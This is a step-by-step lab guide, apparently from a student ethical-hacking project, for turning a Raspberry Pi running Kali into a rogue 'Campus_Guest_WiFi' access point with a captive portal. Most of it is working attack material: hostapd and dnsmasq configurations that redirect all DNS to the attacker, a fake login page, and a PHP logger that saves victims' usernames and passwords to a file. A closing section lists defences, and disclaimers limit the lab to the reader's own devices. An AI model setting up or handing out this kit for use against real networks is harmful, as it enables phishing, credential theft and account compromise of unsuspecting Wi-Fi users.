# Raspberry Pi Rogue Access Point + Captive Portal Lab Setup

### Ethical Hacking Project – Rogue AP & Credential Harvesting

This guide describes how to build a **rogue wireless access point with a captive portal** using a **Raspberry Pi running Kali Linux**. The environment is isolated using a **mobile phone hotspot** as the upstream internet connection.

This setup replicates a realistic wireless phishing attack scenario where a victim connects to a malicious Wi-Fi network and is redirected to a fake login portal.

⚠️ **Important:**
This lab must only be performed in a **controlled environment using your own devices**. Do not run rogue access points on public or institutional networks.

---

# Lab Architecture

```
Internet
   │
Phone Hotspot
   │
 wlan0
Raspberry Pi (Attacker)
   │
 wlan1 (USB WiFi Adapter)
   │
Rogue WiFi Network
   │
Victim Device
   │
Captive Portal
   │
Credential Harvesting
```

Interface roles:

```
wlan0 → Connects to phone hotspot (internet)
wlan1 → Rogue access point
```

---

# Hardware Requirements

### Attacker Device

* Raspberry Pi 3 / 4 / Zero 2 W
* MicroSD card (16GB+)
* USB Wi-Fi adapter supporting AP mode

Example adapter used:

```
Alfa AWUS036ACH
```

### Victim Device

* Smartphone
* Laptop
* Virtual machine

### Internet Source

* Personal mobile hotspot

---

# Step 1 – Install Kali Linux on Raspberry Pi

Download the **Kali Linux Raspberry Pi image** from:

```
https://www.kali.org/get-kali/
```

Flash the image using:

* Raspberry Pi Imager
* Balena Etcher

Insert the SD card and boot the Raspberry Pi.

Default login:

```
username: kali
password: kali
```

Update the system:

```bash
sudo apt update
sudo apt upgrade -y
```

---

# Step 2 – Connect Raspberry Pi to Phone Hotspot

Enable **WiFi tethering on your phone**.

Scan networks:

```bash
nmcli dev wifi list
```

Connect to the hotspot:

```bash
nmcli dev wifi connect "HotspotName" password "password"
```

Verify network interfaces:

```bash
ip a
```

Example output:

```
wlan0 → connected to hotspot
wlan1 → USB wireless adapter
```

---

# Step 3 – Install Required Packages

Install networking services and web server:

```bash
sudo apt install hostapd dnsmasq lighttpd php -y
```

Stop services before configuration:

```bash
sudo systemctl stop hostapd
sudo systemctl stop dnsmasq
```

---

# Step 4 – Configure Static IP for Rogue Access Point

Edit dhcpcd configuration:

```bash
sudo nano /etc/dhcpcd.conf
```

Add the following lines:

```
interface wlan1
static ip_address=192.168.4.1/24
```

Restart networking:

```bash
sudo service dhcpcd restart
```

Verify the address:

```bash
ip a
```

Expected:

```
192.168.4.1
```

---

# Step 5 – Configure DHCP and DNS Redirection

Backup the original configuration:

```bash
sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
```

Create a new configuration:

```bash
sudo nano /etc/dnsmasq.conf
```

Add:

```
interface=wlan1
dhcp-range=192.168.4.10,192.168.4.100,255.255.255.0,24h
address=/#/192.168.4.1
```

This configuration:

* assigns IP addresses to victims
* redirects all DNS requests to the captive portal

---

# Step 6 – Configure the Rogue Access Point

Create hostapd configuration:

```bash
sudo nano /etc/hostapd/hostapd.conf
```

Example configuration:

```
interface=wlan1
driver=nl80211
ssid=Campus_Guest_WiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
```

Enable the configuration:

```bash
sudo nano /etc/default/hostapd
```

Set:

```
DAEMON_CONF="/etc/hostapd/hostapd.conf"
```

---

# Step 7 – Start the Rogue Access Point

Start services:

```bash
sudo systemctl start hostapd
sudo systemctl start dnsmasq
```

Verify that the wireless network appears:

```
Campus_Guest_WiFi
```

This represents the **Initial Access stage** of the attack.

---

# Step 8 – Create the Captive Portal

Navigate to the web server directory:

```bash
cd /var/www/html
```

Remove the default page:

```bash
sudo rm index.html
```

Create the login page:

```bash
sudo nano index.html
```

Example captive portal:

```html
<h2>Campus Guest WiFi Login</h2>

<form method="POST" action="login.php">
Email:<br>
<input type="text" name="username"><br>

Password:<br>
<input type="password" name="password"><br><br>

<input type="submit" value="Login">
</form>
```

---

# Step 9 – Create Credential Logger

Create a PHP script:

```bash
sudo nano login.php
```

Add:

```php
<?php

file_put_contents("creds.txt",
"User: ".$_POST['username']." Pass: ".$_POST['password']."\n",
FILE_APPEND);

header("Location: https://google.com");

?>
```

Captured credentials will be stored in:

```
/var/www/html/creds.txt
```

---

# Step 10 – Start the Web Server

Start Lighttpd:

```bash
sudo systemctl start lighttpd
```

The captive portal is now active.

---

# Step 11 – Test the Attack

On the victim device:

1. Connect to:

```
Campus_Guest_WiFi
```

2. Open a web browser

3. The captive portal appears

4. Enter login credentials

Example captured credentials:

```
User: victim@email.com
Pass: password123
```

View the captured data:

```bash
cat /var/www/html/creds.txt
```

---

# Step 12 – Discover Connected Devices

Display connected clients:

```bash
iw dev wlan1 station dump
```

Example output:

```
MAC address
signal strength
connection time
```

This supports the **Discovery stage** in the attack chain.

---

# Step 13 – Optional: Capture Network Traffic

For deeper analysis, capture network traffic:

```bash
sudo tcpdump -i wlan1
```

This can show:

```
DNS requests
HTTP redirects
login POST requests
```

This step demonstrates **network traffic interception and analysis**.

---

# Step 14 – Stop the Lab

Stop all services when finished:

```bash
sudo systemctl stop hostapd
sudo systemctl stop dnsmasq
sudo systemctl stop lighttpd
```

---

# Mapping to the Attack Lifecycle

| Stage             | Demonstration                |
| ----------------- | ---------------------------- |
| Setup             | Raspberry Pi configuration   |
| Initial Access    | Rogue WiFi network           |
| Execution         | DNS redirection              |
| Credential Access | Captive portal login         |
| Discovery         | Connected client enumeration |
| Command & Control | Credential logging           |
| Exfiltration      | Exporting credential logs    |
| Impact            | Account compromise           |

---

# Security Considerations

To prevent similar attacks, organizations should implement:

* WPA3 or enterprise authentication (802.1X)
* Wireless Intrusion Detection Systems (WIDS)
* DNS monitoring
* user security awareness training
* certificate validation enforcement

---

# Disclaimer

This project is intended **only for educational purposes within a controlled laboratory environment**. The techniques demonstrated here must **not be used against networks or devices without explicit authorization**.
